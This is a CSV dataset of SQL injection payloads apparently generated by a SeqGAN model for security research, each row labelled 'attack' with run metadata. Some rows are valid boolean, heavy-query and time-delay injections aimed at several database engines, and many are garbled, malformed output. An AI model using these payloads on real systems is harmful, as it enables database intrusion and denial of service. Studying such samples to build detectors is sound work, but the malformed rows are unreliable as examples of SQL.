label,payload,family,payload_type,method,run_id,sample_index
attack,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,108
attack,"1%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,109
attack,"1""  )   as'  =  's aguqstabldom.sypsers as toomains as (  8220ies as rs domains t5sibm.systablus ss ikesatobte' from dual where 5309  =  5309 and 3202  =  like  (  'ables as rdb$coltations as t3  )  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,110
attack,"1'+  (  select 'kaprrrdbkegapperce_message  (  char  (  3645  *  )   from (  ""gzhp""  =  '  )   where 3767  =  3767 and 6240  =    (  ' where 5019  =  3645",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,111
attack,"1""  )  -- where 5333  =  5019 or  )and    (    (     (     (  'abcdefg',tab  (  c101,  ,500000000  (  select   (  *  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,112
attack,"1""   )    )     =     (    (   ""qhareexperare' from dual where 5309  =  5309 and 3202  =  like  (  'all_users sysibm.sysstables as tobmbasibmsspsysibm.sibms_sersibmssagtibns ssipl_usert  (  rdbmbcdem.s as t  (  ries funcndbmbs_bses_pipee.rerecrie_s",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,113
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,114
attack,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jrsxs"" like ""||abcefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,115
attack,"1%1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  ""qsywvlpwbm.syasibm.sypes_susumstables sssibom.stables rssigs5000000ssqs where 7272  =  *  )   as rdb$fumtaieserstables all_useripesssatdb$comtasers t1,sysibssaggkv66gpllini",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,116
attack,1 or 2367 5903  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,117
attack,1  )   and   (  'xcnj'  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,118
attack,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,119
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,120
attack,1'qykppnpeper  (  *  )   and   (  67  )   and    (    (   5  )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,121
attack,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xm.san'  =  '8514qsys'  =  'kibx.mas t5  ,all_useriessagex col_users as dbusers t2,sysgins t2,aldom.t_  (  3702  (  112  )   and    (  select cncdeles sysssigipeas ms as t1,rdboustableigeas at  (  ch",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,122
attack,1'   )    )      )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,123
attack,"select 3018  )   and 5556  =  ',rl_users t5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,124
attack,1'  )   where 3767  =  3767 and 6240  =    (  'jjganvzdsqwps,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,125
attack,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,126
attack,"1%'  )   or 8384  =  like  (  'abcdelas t1,all_users elles usumsers t2,symsibm.satie_mas assgssgibls ge5000000--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,127
attack,1   )    )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,128
attack,"1""  )   and ""jkfk""  =  -- -- 1",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,129
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,130
attack,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'tpg",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,131
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,132
attack,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%   ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,133
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,134
attack,"1""  )   where 8148  =  2839",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,135
attack,select from 8407  =  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,136
attack,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,137
attack,1  (  *   where  (  8459  8459  )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,138
attack,"select   (    'abcdefg')  ,sypbs_pipsers sables ts_p.tab  (  500000000/sysibm.sysibm.systablessi   (sips_kibceird  (  'qqpjq'||,5  )   from     (  select r  (  char  )  )   --  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,139
attack,"1""  ||select cnds as all_s_pes rs t3 and 8407  =  5019#",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,140
attack,1   )    )      )    )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,141
attack,"select 2494  =  4297 or 5556  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,142
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,143
attack,"1""  )   abxerdesagex   from rdb$fieve_sagtie_sepr  (  *  sat_bfblob  (  (  500000000   and   (  8459  8459  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,144
attack,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,145
attack,"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""hxjelsers g'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'ndoms_blds  (  500000000  )   or 9643  =    (  select count  (  hex  (  hix  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,146
attack,"1%"" and    )    aserdepeastaldbles dollas t4,all_uses 8407  =  1 or 9643  3702  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,147
attack,"1q'  =  'vxmqwhere db$f'  =  '""  =  ""rdbegexsubsum.rs as tomaicndbms as t3  (  hex  (  *  )   from ge_zive",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,148
attack,"-6407'  )   or elt  (  1631  =  4946,4946  )   and   (  'jpppjrrsisnqasstablecras as 3707hr  (  select and 3707  =    (2   where 9687  =  3175 and   (  8220  '  )   or elt  (  1631  =  4946,4946  )   and   (  '  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,149
attack,"1%load_filesgblldbesers sipes   (    ))+  (  112  )   or 7078  =  9354,0  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,150
attack,1'  )   where 3018  =  8148--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,151
attack,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  ')   and 8312  =    (  select where 5606  =  9782 or mables as domaldbfg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,152
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,153
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,154
attack,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,155
attack,"1%5556%then""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,156
attack,"1""  )   as g',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'   )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,157
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,158
attack,"1""  )   where 2332  =  #",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,159
attack,"-8025""  )   or   (  1436  =  4186  )  *4186 and   (  ""sqstp5xjapp_xjfkxj",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,160
attack,"1""   )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,161
attack,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,162
attack,"1""  )   abxerands as t2,ol_ums as t3  (  69  )   from geeie.rece  (  *  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,163
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,164
attack,"select like  (  hex  )   from geper  (  select and rsibm.ssat  (  101,4062  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,165
attack,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,166
attack,1%' or 7417  =    (    (   '   )    )     )   or 6872  =  6872 and    (    (     (  '    (  select cont  (  *  )   #,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,167
attack,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,168
attack,1jkw,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,169
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,170
attack,"-2925%i   ""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,171
attack,"1""  )   akepepe_  (  1041  =  like  (  rdb$ftiesage  (  select and    (    (   iphs_st_usersibm.sage  (  select count  (  *  )   from rdbblesysers s t4,all_users as tsssg)""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,172
attack,1%'  )   and    (       sysbsg,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,173
attack,1%',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,174
attack,1%'   )    )      )   and   (  8459  =  9607  8459  )   or vhehrex r4062(  *  )   from rdb$fusum.ta(  cprans izkere_sage  (  chr  (  68  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,175
attack,"1%""  )   and   (  7427  )  ,ds'qipt'(  ,0  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,176
attack,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,177
attack,"select or ht  (  'abcdefg',  (  char  (  *  rage  4728' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and '  (  select coupp  rds where u9354d4906-- or 1  =  2332 or 7078  =  8459  )   from rdbmblsibmssage_sers g(  109  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,178
